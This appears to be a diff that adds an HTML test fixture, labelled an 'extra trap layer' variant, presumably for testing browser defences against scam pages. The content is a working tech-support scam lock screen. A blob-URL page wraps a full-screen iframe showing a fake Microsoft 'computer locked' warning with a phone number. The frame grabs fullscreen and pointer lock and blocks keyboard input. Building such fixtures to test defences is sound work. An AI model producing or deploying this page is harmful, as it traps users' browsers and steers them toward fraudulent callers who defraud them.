@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<!-- Variant (extra trap layer): blob page whose content is a full-viewport srcdoc iframe; the frame also grabs fullscreen and pointer lock. -->
+<html lang="en"><head><meta charset="utf-8"><title>Loading</title></head>
+<body>
+<script>
+  const inner = `<!DOCTYPE html><html><head><meta charset="utf-8"><title>Alert</title>
+  <style>body{margin:0;background:#000;color:#fff;font-family:Arial;height:100vh;display:flex;align-items:center;justify-content:center;text-align:center}</style></head>
+  <body><div><h1>Your computer has been locked</h1><p>Windows Firewall detected suspicious activity. Do not restart.</p>
+  <p>Call Microsoft Support: 1-888-555-0177</p></div>
+  <script>
+    try { document.documentElement.requestFullscreen(); } catch (e) {}
+    try { document.body.requestPointerLock(); } catch (e) {}
+    document.addEventListener('keydown', e => e.preventDefault());
+  <\/script></body></html>`;
+  const outer = `<!DOCTYPE html><html><head><meta charset="utf-8"><title>Windows</title>
+  <style>html,body{margin:0;height:100%}iframe{position:fixed;inset:0;width:100vw;height:100vh;border:0}</style></head>
+  <body><iframe srcdoc="${inner.replace(/&/g,'&amp;').replace(/"/g,'&quot;')}"></iframe></body></html>`;
+  location.href = URL.createObjectURL(new Blob([outer], { type: 'text/html' }));
+</script></body></html>
